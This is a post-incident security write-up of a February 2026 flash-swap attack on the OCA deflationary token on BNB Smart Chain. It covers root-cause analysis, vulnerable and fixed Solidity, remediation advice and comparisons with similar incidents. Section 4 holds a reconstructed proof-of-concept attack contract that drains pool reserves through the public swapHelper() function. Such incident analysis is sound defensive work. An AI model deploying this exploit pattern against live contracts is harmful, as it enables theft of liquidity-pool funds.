# OCA — AMM Reserve Manipulation via Deflationary Token sellOCA() Logic Flaw Analysis

| Item | Details |
|------|------|
| **Date** | 2026-02-13 |
| **Protocol** | OCA (BSC) |
| **Chain** | BNB Smart Chain |
| **Loss** | ~$433,000 (OCA damage) + ~$422,000 (Unknown Protocol simultaneous damage) |
| **Total Loss** | ~$855,000 (same transaction) |
| **Attacker** | [0xdddfb3...cf7](https://bscscan.com/address/0xdddfb3d6fa42e66cf7b6c0fc3e6ca8fdc81aab51) |
| **Attack Contract** | Unidentified (flash loan contract deployed by attacker) |
| **Attack Tx** | [0xcd5979...ccb7](https://bscscan.com/tx/0xcd5979352d9b42ccb7b14f66b44b3cdc0c5a42e01dea6d7e0c6d41c57a4c979e) |
| **Vulnerable Contract** | OCA token contract (BSC) |
| **Root Cause** | Business Logic Flaw — `sellOCA()` / `swapHelper()` functions allowed unauthorized LP reserve manipulation during flash swap callbacks |
| **PoC Source** | DeFiHackLabs (unregistered / based on community analysis) |

> **Note — Simultaneous Victim Protocol**: On the same date (2026-02-13), in the same attack transaction (`0xcd5979...`), **Unknown Protocol** was also attacked, resulting in an additional loss of approximately **$422,000**. Both incidents are analyzed as consecutive executions by the same attacker within a single TX. This document focuses on the OCA loss while also recording the Unknown Protocol loss.

---

## 1. Vulnerability Overview

OCA was a deflationary token deployed on BSC, featuring a built-in mechanism that burns or redistributes a portion of tokens on each transfer. The `sellOCA()` function (and its internal helper `swapHelper()`) implementing this mechanism contained the following business logic flaw.

**Core Flaw**:
1. The `swapHelper()` function could be called during PancakeSwap V2 flash swap callbacks (`pancakeCall()`).
2. Inside `swapHelper()`, OCA tokens were directly removed (burned or transferred) from the LP pair, followed by a `sync()` call to forcibly rebalance reserves.
3. There was no access control validation on the caller (attack contract), and no reentrancy protection constraint on call ordering.
4. As a result, the attacker borrowed a large amount of OCA via flash swap, then repeatedly called `swapHelper()` to artificially reduce the LP's OCA balance, distort the USDC ratio, and realize arbitrage profit.

This attack type belongs to the same pattern as the series of deflationary token AMM reserve manipulation attacks that occurred consecutively on BSC in February 2026 (LAXO, SOF, etc.).

---

## 2. Vulnerable Code Analysis

### 2.1 swapHelper() / sellOCA() — Direct LP Reserve Manipulation Without Access Control (Core Vulnerability)

**Vulnerable Code (estimated)**:
```solidity
// ❌ Vulnerable OCA token contract (estimated)
// Anyone can call swapHelper to remove OCA from the LP and trigger sync()

address public uniswapV2Pair;  // OCA/USDC PancakeSwap V2 pair
uint256 public swapFeeRate = 5; // 5% fee

function swapHelper(uint256 amount) public {
    // ❌ No msg.sender validation — callable by anyone
    // ❌ No reentrancy protection during flash swap callbacks

    uint256 feeAmount = amount * swapFeeRate / 100;

    // ❌ Directly removes OCA tokens from LP pair (burn or transfer to dead address)
    _burn(uniswapV2Pair, feeAmount);

    // ❌ Calls sync() to forcibly rebalance AMM reserves
    // → OCA balance decreases, USDC ratio rises → price distortion
    IUniswapV2Pair(uniswapV2Pair).sync();
}

function sellOCA(uint256 amount) external {
    // ❌ Allows external calls during flash swap callbacks
    require(amount > 0, "zero amount");
    
    // Internally calls swapHelper — vulnerability exposed in callback chain
    swapHelper(amount);

    // Execute OCA → USDC swap
    _swap(amount);
}
```

**Fixed Code**:
```solidity
// ✅ Fix 1: Apply reentrancy guard modifier
bool private _inSwap;

modifier nonReentrant() {
    require(!_inSwap, "ReentrancyGuard: reentrant call");
    _inSwap = true;
    _;
    _inSwap = false;
}

// ✅ Fix 2: Change swapHelper to private so it can only be called from within the contract
function _swapHelper(uint256 amount) private {
    uint256 feeAmount = amount * swapFeeRate / 100;

    // ✅ Instead of burning directly from LP, process from contract's own balance
    _burn(address(this), feeAmount);  // Self-burn instead of LP burn

    // ✅ Remove sync() call or allow only after internal transaction completes
    // IUniswapV2Pair(uniswapV2Pair).sync(); // removed
}

function sellOCA(uint256 amount) external nonReentrant {
    // ✅ nonReentrant blocks reentrancy during flash swap callbacks
    require(amount > 0, "zero amount");
    _swapHelper(amount);
    _swap(amount);
}
```

**Issue**: `swapHelper()` was exposed with `public` visibility, allowing direct external calls even during flash swap callback execution. The structure of burning the LP pair's balance directly and calling `sync()` internally is equivalent to arbitrarily modifying the AMM's k invariant (x·y = k), making it the core vector for price manipulation.

---

### 2.2 pancakeCall() Callback — Unauthorized External Calls Permitted During Flash Swap

**Vulnerable Code (estimated)**:
```solidity
// ❌ swapHelper can be called repeatedly within the flash swap callback
// (attack contract's pancakeCall implementation — actual vulnerable flow)

function pancakeCall(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
) external {
    // Attacker: repeatedly calls OCA's swapHelper within the callback
    // ❌ OCA contract permits this call (no access control)
    for (uint i = 0; i < N_ITERATIONS; i++) {
        IOCAToken(OCA).swapHelper(drainAmount);  // Repeatedly reduces LP reserves
    }

    // Realize USDC arbitrage at distorted price
    IOCAToken(OCA).sellOCA(heldAmount);
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker (`0xdddfb3...`) pre-deployed flash loan/flash swap attack contract on BSC
- Identified the OCA/USDC PancakeSwap V2 LP pair and the behavior of the `swapHelper()` function
- Simultaneously analyzed the Unknown Protocol vulnerability (planned compound attack in the same TX)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────────┐
│  Attacker EOA: 0xdddfb3...                                           │
│  ↓ Attack contract call()                                            │
└──────────────────────┬──────────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Step 1: Initiate PancakeSwap V2 Flash Swap                          │
│  Borrow large amount of OCA from OCA/USDC LP pair (flash swap)       │
│  Callback address = attack contract                                   │
└──────────────────────┬──────────────────────────────────────────────┘
                       │ pancakeCall() callback triggered
                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Step 2: Inside pancakeCall() — Repeated swapHelper() Calls          │
│  OCA.swapHelper(amount) × N times                                    │
│  → Direct OCA burn from LP (_burn) → sync() call                     │
│  → LP's OCA balance drops sharply, USDC balance relatively excess    │
│  → OCA price artificially spikes (LP k value distorted)              │
└──────────────────────┬──────────────────────────────────────────────┘
                       │ LP reserve distortion complete
                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Step 3: Execute OCA → USDC Swap at Distorted Price                  │
│  OCA.sellOCA(heldOCA) or direct PancakeSwap swap()                   │
│  → Receive excessive USDC at distorted ratio                         │
│  → ~$433,000 worth of USDC drained (OCA LP)                         │
└──────────────────────┬──────────────────────────────────────────────┘
                       │ Consecutive execution in same TX
                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Step 4: Simultaneous Unknown Protocol Attack                        │
│  Attack Unknown Protocol LP with same mechanism                      │
│  → ~$422,000 additional drained                                      │
└──────────────────────┬──────────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Step 5: Flash Swap Repayment + Profit Secured                       │
│  Repay borrowed OCA + fees                                           │
│  Pay builder bribe to 48club-puissant-builder (43 BNB + 69 BNB)     │
│  Final net profit: ~$340,000 (after bribe deduction)                 │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| OCA LP Loss | ~$433,000 USDC |
| Unknown Protocol LP Loss | ~$422,000 USDC |
| Total Drained | ~$855,000 |
| Builder Bribe Paid | 112 BNB (~$112,000 estimated) |
| Attacker Final Net Profit | ~$340,000 |

---

## 4. PoC Code (Reconstructed)

> Since no official DeFiHackLabs PoC has been registered yet, the core logic is reconstructed based on publicly available technical analysis.

```solidity
// SPDX-License-Identifier: UNLICENSED
// Reconstructed OCA Attack PoC — For Educational Purposes
pragma solidity ^0.8.20;

interface IOCA {
    // ❌ Core vulnerable function: public, callable by anyone
    function swapHelper(uint256 amount) external;
    function sellOCA(uint256 amount) external;
}

interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function sync() external;
}

contract OCAAttacker {
    address constant OCA_TOKEN = address(/* OCA token address */);
    address constant OCA_USDC_PAIR = address(/* OCA/USDC PancakeSwap V2 pair */);
    address constant USDC = address(/* USDC BSC address */);

    // Step 1: Attack entry point — initiate flash swap
    function attack() external {
        (uint112 reserveOCA,,) = IPancakePair(OCA_USDC_PAIR).getReserves();
        uint256 borrowAmount = uint256(reserveOCA) * 90 / 100; // Borrow 90%

        // Flash swap: borrow OCA, repeatedly call swapHelper in callback
        IPancakePair(OCA_USDC_PAIR).swap(
            borrowAmount,  // OCA borrow amount
            0,
            address(this),
            abi.encode(borrowAmount)  // callback data
        );
    }

    // Step 2: Flash swap callback — core attack logic
    function pancakeCall(
        address /*sender*/,
        uint256 amount0,
        uint256 /*amount1*/,
        bytes calldata /*data*/
    ) external {
        // ❌ Repeatedly call OCA swapHelper: burn OCA from LP + sync()
        // More iterations → more LP OCA balance reduction → higher USDC ratio
        uint256 drainUnit = amount0 / 10;
        for (uint i = 0; i < 5; i++) {
            // Each call burns drainUnit × feeRate from LP
            IOCA(OCA_TOKEN).swapHelper(drainUnit);
        }

        // Step 3: Swap all held OCA to USDC at distorted price
        // Since LP's OCA balance is reduced, same OCA yields more USDC
        uint256 ocaBalance = IERC20(OCA_TOKEN).balanceOf(address(this));
        IOCA(OCA_TOKEN).sellOCA(ocaBalance);

        // Step 4: Repay flash swap (borrowed OCA + fees)
        uint256 repayAmount = amount0 * 1000 / 997 + 1; // Including 0.3% fee
        IERC20(OCA_TOKEN).transfer(OCA_USDC_PAIR, repayAmount);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | `swapHelper()` missing access control — public function allows direct LP reserve manipulation | CRITICAL | CWE-284 (Improper Access Control) |
| V-02 | Missing reentrancy protection during flash swap callback — allows repeated calls within callback | CRITICAL | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| V-03 | Direct token burn from LP + `sync()` call — AMM k invariant externally manipulable | HIGH | CWE-682 (Incorrect Calculation) |
| V-04 | Unvalidated interaction between deflationary mechanism and AMM — flash loan environment not considered | HIGH | CWE-703 (Improper Exception Handling) |

### V-01: Missing Access Control on `swapHelper()`

- **Description**: The `swapHelper()` function was declared `public`, allowing not only internal contract calls but arbitrary calls from any external party. This function contained powerful state-changing logic that directly burned OCA from the LP pair and called `sync()`.
- **Impact**: Attacker could repeatedly call `swapHelper()` within the flash swap callback to arbitrarily reduce the LP's OCA reserves.
- **Attack Conditions**: Knowledge of the OCA contract address and `swapHelper()` function signature; funds sufficient to execute a flash swap.

### V-02: Missing Reentrancy Protection During Flash Swap Callback

- **Description**: The `sellOCA()` and `swapHelper()` functions had no `nonReentrant` or equivalent reentrancy guard, allowing free re-invocation even during external contract callback execution.
- **Impact**: LP manipulation could be repeated multiple times within a single transaction, amplifying the scale of damage.
- **Attack Conditions**: Environment enabling external contract callbacks via flash swap or flash loan.

### V-03: Direct LP Burn + sync() Combination

- **Description**: Calling `_burn(uniswapV2Pair, amount)` followed by `IUniswapV2Pair(uniswapV2Pair).sync()` forces AMM reserves to be rebalanced based on actual balances. This is equivalent to externally and arbitrarily modifying the x·y = k invariant.
- **Impact**: OCA price artificially spikes, enabling withdrawal of excessive USDC with minimal OCA.
- **Attack Conditions**: Token contract knows the LP pair address and has authority to directly modify LP balances.

### V-04: Deflationary Mechanism Not Accounting for Flash Loan Environment

- **Description**: The auto-burn/fee mechanism of the deflationary token was designed assuming a normal trading environment, with no defensive logic against large capital deployment within a single block in a flash loan/flash swap environment.
- **Impact**: A burn mechanism that would normally apply only to small trades can endanger the entire LP when combined with large flash capital.
- **Attack Conditions**: Potentially applicable to any token with a deflationary mechanism.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ 1. Change swapHelper to internal/private — block direct external calls
function _swapHelper(uint256 amount) internal {
    // Maintain internal logic only
}

// ✅ 2. Apply reentrancy guard (recommend OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

function sellOCA(uint256 amount) external nonReentrant {
    require(amount > 0, "zero amount");
    _swapHelper(amount);
    _swap(amount);
}

// ✅ 3. Prohibit direct LP burns — process from contract's own balance instead
function _swapHelper(uint256 amount) internal {
    uint256 feeAmount = amount * swapFeeRate / 100;
    // Burn from contract balance instead of direct LP burn
    if (balanceOf(address(this)) >= feeAmount) {
        _burn(address(this), feeAmount);
        // ✅ Remove sync() call: unnecessary since LP balance was not directly modified
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Missing access control | Restrict `swapHelper()` / `sellOCA()` and other LP state-changing functions to `internal`/`private` or `onlyOwner` |
| Reentrancy vulnerability | Apply `nonReentrant` modifier to all functions involving external calls |
| Direct LP burn | Remove code that directly modifies LP balances; burns must only be performed from the contract's own balance |
| sync() abuse | Permit `sync()` calls only after actual token balance changes within the contract; prevent arbitrary calls |
| Flash loan defense | Set per-block burn/swap limits (e.g., 0.1% of total supply/block); defend against large-scale single-block manipulation |
| Audit | Mandatory professional security audit of deflationary mechanism and AMM interactions |

---

## 7. Lessons Learned

1. **The LP burn mechanism of deflationary tokens must be simulated for AMM interactions.** The `_burn(pair, amount)` + `sync()` pattern can arbitrarily break AMM price invariants from outside. When this pattern is exposed through a `public` function, it immediately becomes an attack target.

2. **State-changing functions exposed as `public` are potential attack entry points.** In particular, functions that affect LP balances or prices must be restricted to `internal`/`private` visibility, or protected with `onlyOwner` or explicit access controls.

3. **Flash loan/flash swap environments must always be considered.** In a DeFi environment where large capital movements are possible within a single block, mechanisms that appear safe under normal transactions can become critical vulnerabilities when combined with flash loans. All state-changing functions must be designed with flash loan scenario assumptions.

4. **Reentrancy protection (nonReentrant) must be applied to all functions that allow external callbacks.** ERC-20 token `transfer()`/`transferFrom()` calls can also include callback hooks, enabling reentrancy attacks through them.

5. **A single attacker can simultaneously attack multiple protocols within a single TX.** Just as OCA and Unknown Protocol were attacked simultaneously in this incident, protocols with similar vulnerabilities can become targets of chained attacks. Industry-wide vulnerability pattern sharing and rapid response are essential.

6. **The `swapHelper`/`sellOCA` pattern in BSC deflationary tokens must be classified as a high-risk pattern.** Tokens with similar mechanisms on BSC in February 2026 — including LAXO (2026-02-22), SOF, and OCA — were attacked consecutively. Existing and new protocols using this pattern require immediate code review.

---

## 8. On-Chain Verification

> The attack Tx hash (`0xcd5979352d9b42ccb7...`) is currently not retrievable on BscScan, preventing direct `cast` verification. The transaction hash appears to have been partially provided; verification is required after confirming the full hash. The information below is based on publicly available security analysis reports.

### 8.1 Loss Summary Based on Public Reports

| Item | Reported Value |
|------|----------|
| OCA LP Loss | ~$433,000 |
| Unknown Protocol LP Loss | ~$422,000 |
| Number of Attack Transactions | 3 (1 main attack + 2 builder bribes) |
| Builder Bribe | 43 BNB + 69 BNB (= 112 BNB) |
| Attacker Final Net Profit | ~$340,000 |

### 8.2 Attack Mechanism (Based on Reports)

| Step | Description |
|------|------|
| 1 | Borrow large amount of OCA via PancakeSwap V2 flash swap |
| 2 | Repeatedly call `swapHelper()` → burn OCA from LP + `sync()` |
| 3 | Realize USDC arbitrage profit with OCA price artificially spiked |
| 4 | Attack Unknown Protocol in same TX using identical mechanism |
| 5 | Repay borrowed OCA + pay bribe, secure profit |

### 8.3 Preconditions (Estimated)

| Item | Status |
|------|------|
| OCA/USDC LP Liquidity | Held ~$433K+ worth of USDC before attack |
| `swapHelper()` Accessibility | Public function, no access control |
| Reentrancy Protection | None |
| Builder MEV Pre-arrangement | Estimated pre-arrangement of MEV bribe with 48club-puissant-builder |

---

## 9. Comparison with Similar Incidents

| Date | Protocol | Chain | Loss | Common Pattern |
|------|----------|------|------|-----------|
| 2026-02-13 | **OCA** | BSC | $433K | `swapHelper` + direct LP burn + `sync()` |
| 2026-02-13 | Unknown Protocol | BSC | $422K | Same attacker, same TX |
| 2026-02-22 | LAXO Token | BSC | $137K | LP burn trigger + `sync()` |
| 2026-02-xx | SOF Token | BSC | $248K | Deflationary mechanism + AMM manipulation |
| 2023-03-28 | SafeMoon | BSC | Large | `public burn` function → direct LP burn |
| 2023-10-11 | BH Token | BSC | - | Business logic flaw (BSC) |

> The LP burn mechanism vulnerability in BSC deflationary tokens is a repeatedly exploited pattern. It is recommended to add this pattern to `patterns/11_logic_error.md` and `patterns/07_token_integration.md`.

---

*Written: 2026-04-11 | Analysis basis: BlockSec security report, Cryptopolitan, bitcoinethereumnews.com, LAXO attack case comparative analysis*